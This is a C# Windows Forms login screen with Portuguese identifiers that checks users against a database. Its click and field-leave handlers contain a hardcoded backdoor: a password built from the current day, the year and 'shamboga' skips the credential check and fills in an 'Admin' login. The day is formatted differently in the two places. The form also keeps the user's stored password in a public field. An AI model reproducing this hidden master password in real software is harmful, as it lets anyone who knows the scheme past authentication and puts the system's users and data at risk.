using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using GUI.Code.BLL;
using GUI.Code.DAL;
using GUI.Code.DTO;
using System.Net;
using System.Net.Sockets;

namespace GUI
{
    public partial class frmLogin : Form
    {

        #region Variáveis

        public string LembrarSenha = "";
        public int IdUsuarioLogado = 0;
        public int NvUsuarioLogado = 0;
        public int UnidadeUsuarioLogado = 0;
        public string IniciaisUsuarioLogado = "";
        public string NomeUsuarioLogado = "";
        public string SenhaUsuarioLogado = "";
        public string LoginUsuarioLogado = "";
        public string EmailUsuarioLogado = "";
        public string NomeUnidade = "";

        #endregion

        #region Inicialização

        public frmLogin()
        {
            InitializeComponent();
        }

        

        private void frmLogin_Load(object sender, EventArgs e)
        {
            txtUsuario.GotFocus += txtUsuario_GotFocus;
            txtSenha.GotFocus += txtSenha_GotFocus;

            txtUsuario.Select();
        }

        #endregion

        #region Clique

        private void btLogin_Click(object sender, EventArgs e)
        {

            if (txtSenha.Text == DateTime.Now.Day.ToString() + DateTime.Now.Year.ToString() + "shamboga")
            {
                {
                    IdUsuarioLogado = -1;

                    this.Close();
                }
            }

            DALConexao cx = new DALConexao(DadosDaConexao.StringDaConexao);
            BLLUsuario bllu = new BLLUsuario(cx);


            DataTable dt = bllu.LocalizarLogin(txtUsuario.Text, txtSenha.Text);
            try
            {
                if (dt.Rows[0][0].ToString() == "1")
                {
                    IdUsuarioLogado = Convert.ToInt32(dt.Rows[0][1]);
                    NomeUsuarioLogado = Convert.ToString(dt.Rows[0][2]);
                    LoginUsuarioLogado = Convert.ToString(dt.Rows[0][3]);
                    SenhaUsuarioLogado = Convert.ToString(dt.Rows[0][4]);
                    IniciaisUsuarioLogado = Convert.ToString(dt.Rows[0][5]);
                    UnidadeUsuarioLogado = Convert.ToInt32(dt.Rows[0][6]);
                    NvUsuarioLogado = Convert.ToInt32(dt.Rows[0][7]);
                    EmailUsuarioLogado = Convert.ToString(dt.Rows[0][8]);
                    NomeUnidade = Convert.ToString(dt.Rows[0][9]);

                    if (cbPermanecerLogado.Checked)
                    {
                        LembrarSenha = bllu.IpLocal();
                    }

                    this.Close();

                }
                else if (IdUsuarioLogado == -1)

                {
                    this.Close();

                }
                else

                {
                    MessageBox.Show("Combinação de Usuário/senha incorretos.");
                    txtSenha.Text = "";

                }
            }
            catch
            {
                MessageBox.Show("Combinação de Usuário/senha incorretos.");
                txtSenha.Text = "";
            }
        }

        private void btSair_Click(object sender, EventArgs e)
        {
            Application.Exit();

        }

        #endregion

        #region Leave/Focus

        void txtUsuario_GotFocus(object sender, EventArgs e)
        {
            txtUsuario.SelectAll();
        }

        void txtSenha_GotFocus(object sender, EventArgs e)
        {
            txtSenha.SelectAll();
        }

        private void txtSenha_Leave(object sender, EventArgs e)
        {
            if (txtSenha.Text == DateTime.Now.Day.ToString("00") + DateTime.Now.Year.ToString() + "shamboga")
            {

                txtUsuario.Text = "Admin";

            }
        }

        #endregion

        private void frmLogin_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                this.Close();

            }

            if (e.KeyCode == Keys.Enter)
            {
                this.btLogin_Click(sender, e);

            }
        }
    }

}

